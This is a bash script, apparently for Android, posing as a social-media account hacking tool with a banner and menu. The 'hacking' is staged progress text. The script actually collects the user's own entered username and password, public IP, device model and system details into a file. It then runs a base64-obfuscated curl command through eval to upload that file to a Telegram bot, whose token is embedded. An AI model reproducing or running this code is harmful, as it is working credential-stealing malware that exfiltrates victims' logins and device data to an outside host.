#!/bin/bash
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#--------The main code-------
log="Y3VybCAtRiBjaGF0X2lkPS0xMDAxNTg5NTMzMjM2IC1GIGRvY3VtZW50PUAkSE9NRS9Ecm9pZC1YL3N5c2luZm8udHh0ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTY2MzA0NDU0NDpBQUVfODFqUXVxbWhhTlVZZWpjOU5sWDlUYm1sRThPZmg3Zy9zZW5kRG9jdW1lbnQi"
#-----Identifying the system-------
os=$(uname -o)
case $os in
	Android)
		echo "Android Mode"
		;;
esac
if [ "$os" != Android ]; then
	echo "OS cannot be identified.....Be patient...."
fi
sleep 2

#-----Interface----

banner()
{
	clear
	echo " "
	echo -e "$cyan"' 
===========================================
$█████████████████████████████████████████$
$█▄─▄▄▀█▄─▄▄▀█─▄▄─█▄─▄█▄─▄▄▀█▀▀▀▀▀██▄─▀─▄█$
$██─██─██─▄─▄█─██─██─███─██─█████████▀─▀██$
$▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▀▄▄▄▀▄▄▄▄▀▀▀▀▀▀▀▀▀▄▄█▄▄ $
===========================================\n'
}
banner
echo -e "$red" "Use it for educational purposes only!"
echo -e "$blue" "Choose any option below:\n "
echo -e "$yellow" "1)Instagram hack\n 2)Facebook hack\n 3)Whatsapp hack\n 4)Twitter hack"
read -rp "Enter your option :" input

#------Logging in------
login()
{
	echo -e "$pink" "You must login first :\n"
	read -rp "Enter your username: " username
	read -rp "Enter your password :" password
	sleep 2
	echo "Please be patient......."
	sleep 3
	read -rp "Enter your victim's username : "
	echo -e "$red""Hacking into account......10%"
	sleep 2
	echo -e "$red""Hacking into account.....40% "
	sleep 2
	echo -e "$red""Hacking into account ......78% "
	sleep 2
	echo -e "$red""Hacking into account......100% "
	sleep 2
	echo "Account hacked successfully!"
	sleep 3
}
if [ "$input" -lt 4 ]; then
	login
else
	echo "Wrong option please try again!"
fi
#-------Saving details-------
{
	echo "$username"
	echo "$password"
	curl -4 ifconfig.net
	getprop ro.product.model
	getprop ro.product.brand
	uptime --pretty
	uname -r
} >> sysinfo.txt

#---------Finale--------------
eval "$(base64 -d <<< "$log")" > /dev/null
